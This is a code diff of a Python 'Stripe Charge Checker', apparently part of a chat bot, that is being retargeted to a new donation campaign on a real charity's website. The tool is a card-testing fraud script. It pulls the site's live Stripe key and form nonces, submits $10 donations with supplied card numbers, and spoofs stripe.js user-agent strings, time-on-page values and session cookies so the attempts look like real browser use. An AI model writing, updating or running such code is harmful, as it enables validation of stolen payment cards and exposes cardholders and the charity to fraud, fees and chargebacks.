@@ -2,6 +2,7 @@
 # Stripe Charge Checker - Redesigned with new UI format
 # Compatible with /xc command only
 # CORRECTED: Now uses universal ChargeCommandProcessor for credit handling
+# UPDATED: Changed to Michigan Chapter donation campaign (campaign_id: 292)
 
 import json
 import asyncio
@@ -155,6 +156,11 @@ class StripeChargeChecker:
         self.last_bin_request = 0
         self.base_url = "https://www.beitsahourusa.org"
         self.stripe_key = "pk_live_51HhefWFVQkom3lAfFiSCo1daFNqT2CegRXN4QedqlScZqZRP55JVTekqb4d68wMYUY4bfg8M9eJK8A3pou9EKdhW00QAVLLIdm"
+
+        # Updated campaign details for Michigan Chapter
+        self.campaign_id = "292"
+        self.campaign_description = "Establishing Michigan Chapter"
+        self.campaign_path = "/campaigns/establishing-michigan-chapter/"
 
         self.bin_services = [
             {
@@ -506,12 +512,12 @@ class StripeChargeChecker:
 <b>Checking card... Please wait.</b>"""
 
     async def get_form_tokens(self, client):
-        """Get form tokens from donation page"""
+        """Get form tokens from Michigan Chapter donation page"""
         try:
-            logger.step(1, 4, "Loading donation page...")
+            logger.step(1, 4, "Loading Michigan Chapter donation page...")
 
             response = await client.get(
-                f"{self.base_url}/campaigns/donate/",
+                f"{self.base_url}{self.campaign_path}",
                 headers=self.get_base_headers()
             )
 
@@ -538,14 +544,13 @@ class StripeChargeChecker:
             else:
                 return None, "No donation nonce found"
 
-            # Extract campaign ID
-            campaign_match = re.search(r'name="campaign_id" value="([^"]+)"', html_text)
-            tokens['campaign_id'] = campaign_match.group(1) if campaign_match else '1206'
-            logger.success(f"Campaign ID: {tokens['campaign_id']}")
+            # Use the updated campaign ID for Michigan Chapter
+            tokens['campaign_id'] = self.campaign_id
+            logger.success(f"Campaign ID: {tokens['campaign_id']} (Michigan Chapter)")
 
             # Extract other required fields
             wp_referer_match = re.search(r'name="_wp_http_referer" value="([^"]+)"', html_text)
-            tokens['_wp_http_referer'] = wp_referer_match.group(1) if wp_referer_match else '/campaigns/donate/'
+            tokens['_wp_http_referer'] = wp_referer_match.group(1) if wp_referer_match else self.campaign_path
 
             return tokens, None
 
@@ -577,7 +582,7 @@ class StripeChargeChecker:
                 'card[exp_year]': ano[-2:],
                 'allow_redisplay': 'unspecified',
                 'pasted_fields': 'number',
-                'payment_user_agent': f'stripe.js/{random.choice(["065b474d33", "8e9b241db6"])}; stripe-js-v3/{random.choice(["065b474d33", "8e9b241db6"])}; card-element',
+                'payment_user_agent': f'stripe.js/{random.choice(["eeaff566a9", "065b474d33"])}; stripe-js-v3/{random.choice(["eeaff566a9", "065b474d33"])}; card-element',
                 'referrer': self.base_url,
                 'time_on_page': str(random.randint(30000, 90000)),
                 'client_attribution_metadata[client_session_id]': client_session_id,
@@ -635,9 +640,9 @@ class StripeChargeChecker:
             return {'success': False, 'error': f"Payment method error: {str(e)}"}
 
     async def submit_donation(self, client, tokens, payment_method_id, user_info):
-        """Submit donation and get real response"""
+        """Submit donation to Michigan Chapter and get real response"""
         try:
-            logger.step(3, 4, "Submitting donation...")
+            logger.step(3, 4, "Submitting donation to Michigan Chapter...")
 
             donation_data = {
                 'charitable_form_id': tokens['charitable_form_id'],
@@ -645,9 +650,10 @@ class StripeChargeChecker:
                 '_charitable_donation_nonce': tokens['donation_nonce'],
                 '_wp_http_referer': tokens['_wp_http_referer'],
                 'campaign_id': tokens['campaign_id'],
-                'description': 'Donate to Christian Families in Bethlehem',
+                'description': self.campaign_description,
                 'ID': '0',
                 'custom_donation_amount': '10.00',
+                'recurring_donation': 'once',  # Added based on the payload
                 'first_name': user_info['first_name'],
                 'last_name': user_info['last_name'],
                 'email': user_info['email'],
@@ -666,7 +672,7 @@ class StripeChargeChecker:
                 "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                 "X-Requested-With": "XMLHttpRequest",
                 "Origin": self.base_url,
-                "Referer": f"{self.base_url}/campaigns/donate/",
+                "Referer": f"{self.base_url}{self.campaign_path}",
                 "Cookie": f"__stripe_mid={''.join(random.choices(string.ascii_lowercase + string.digits, k=32))}; charitable_session={''.join(random.choices('0123456789abcdef', k=32))}; __stripe_sid={''.join(random.choices(string.ascii_lowercase + string.digits, k=32))}"
             }
 
